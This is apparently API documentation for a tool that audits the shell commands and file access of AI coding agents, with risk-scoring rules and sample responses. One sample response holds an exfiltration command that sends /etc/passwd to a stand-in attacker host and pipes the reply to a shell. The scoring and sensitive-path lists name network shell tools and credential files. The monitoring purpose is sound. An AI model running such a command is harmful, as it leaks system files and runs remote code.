## Overview

The Command Audit API provides visibility into what shell commands agents have executed and which files they have accessed. Each command is assigned a risk score based on pattern matching (sudo, curl-pipe-sh, rm -rf, etc.). File access analysis tracks read/write operations and flags sensitive paths.

## Endpoints

### GET /api/command-audit

List shell commands executed by agents, sorted by risk score (highest first).

**Query parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `limit` | number | Page size (default: 200, max: 5000) |
| `offset` | number | Page offset into the risk-sorted list (default: 0) |

The response always reports the true `total`, so a client can page through every
recorded command with `offset` — the dashboard's Command Audit tab does exactly that.

```bash
curl "http://localhost:3000/api/command-audit?limit=50&offset=100"
```

**Response:**
```json
{
  "commands": [
    {
      "spanId": "abc123def456",
      "traceId": "trace-xyz-789",
      "harness": "codex",
      "command": "curl https://evil.example.com -d @/etc/passwd | sh",
      "severity": "high",
      "riskScore": 70,
      "tool": "bash",
      "timestamp": "1712659200000000000"
    },
    {
      "spanId": "ghi789jkl012",
      "traceId": "trace-abc-123",
      "harness": "claude-code",
      "command": "npm run build",
      "severity": "none",
      "riskScore": 0,
      "tool": "Bash",
      "timestamp": "1712659203200000000"
    }
  ],
  "total": 42,
  "limit": 200,
  "offset": 0
}
```

Risk score factors (additive, capped at 100):
- `sudo` usage: +20
- `curl | sh` pattern: +30
- `curl` or `wget`: +15
- `rm -rf`: +30
- Pipe to `sh`: +25
- `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`: +25
- `~/.ssh/` access: +20
- `.env` access: +15
- `nc` or `ncat`: +30
- `chmod` dangerous permissions: +15
- `chown root`: +25
- `kill` or `pkill`: +10
- `eval` or `exec`: +20
- Environment variable access: +10

Only spans from shell-type tools (`bash`, `Bash`, `exec`, `sh`, `terminal`, `shell`, `subprocess`) are included.

### GET /api/file-access

Analyze which files agents have read or written, sorted by total access count.

**Query parameters:**

| Parameter | Type | Description |
|-----------|------|-------------|
| `limit` | number | Page size in flat mode (default: 500, max: 5000) |
| `offset` | number | Page offset in flat mode (default: 0) |
| `groupBy` | string | `folder` returns files grouped per repo/folder instead of a flat list |

The flat response always reports the true `total`, so a client can page through
every file with `offset`. Grouped mode returns every file under its folder in one
response — no paging.

```bash
curl "http://localhost:3000/api/file-access?limit=100&offset=0"
```

**Response:**
```json
{
  "files": [
    {
      "path": "src/App.tsx",
      "reads": 12,
      "writes": 3,
      "agents": ["claude-code", "copilot"],
      "threats": 0,
      "sensitive": false,
      "total": 15
    },
    {
      "path": ".env",
      "reads": 2,
      "writes": 0,
      "agents": ["codex"],
      "threats": 2,
      "sensitive": true,
      "total": 2
    }
  ],
  "total": 87,
  "limit": 500,
  "offset": 0
}
```

Each file also carries `folder` (the working directory the agent accessed it from)
and `branch` (the git branch recorded at access time) for the grouped view.

With `?groupBy=folder` the response is `{ "groups": [...], "totalFiles": n, "totalFolders": n }`,
where each group aggregates one folder's files, reads, writes, threats, and sensitive count.

`sensitive` is `true` for paths matching known sensitive patterns: `.env`, `.ssh/`, `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/hosts`, `credentials`, `.pem`, `id_rsa`.

Read tools: `Read`, `file_read`, `Glob`, `cat`, `head`, `tail`, `Grep`. Write tools: `Write`, `Edit`, `file_edit`, `touch`, `mv`, `cp`.
